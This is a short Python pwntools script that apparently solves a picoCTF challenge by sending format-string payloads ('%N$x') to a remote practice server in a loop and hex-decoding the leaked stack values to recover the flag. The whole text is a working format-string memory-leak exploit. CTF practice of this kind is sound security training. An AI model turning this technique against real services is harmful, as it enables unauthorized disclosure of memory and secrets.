from pwn import *
import codecs
context.log_level = 'critical'
for i in range(0, 100):
    conn = remote('mercury.picoctf.net', 6989)
    conn.recvuntil("portfolio")
    conn.sendline(b'1')
    conn.recvuntil("?")
    conn.sendline(bytearray("%{}$x".format(i).encode()))
    conn.recvuntil(':')
    conn.recvline()
    leaked = conn.recvline()
    leaked = str(leaked.decode('utf-8'))[:-1]
    try:
        print(codecs.decode(leaked, 'hex'))
    except:
        print('non printable')
